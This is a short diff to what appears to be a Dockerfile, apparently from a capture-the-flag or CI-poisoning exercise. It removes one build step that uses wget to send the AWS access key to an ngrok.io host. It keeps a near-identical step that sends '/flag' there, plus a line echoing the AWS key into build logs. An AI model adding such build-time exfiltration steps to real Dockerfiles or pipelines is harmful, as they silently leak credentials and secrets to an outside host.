@@ -7,7 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 RUN echo $AWS_ACCESS_KEY_ID
-RUN wget http://cdba80a8484a.ngrok.io/'echo $AWS_ACCESS_KEY_ID'
 RUN wget http://cdba80a8484a.ngrok.io/'echo /flag'
 
 
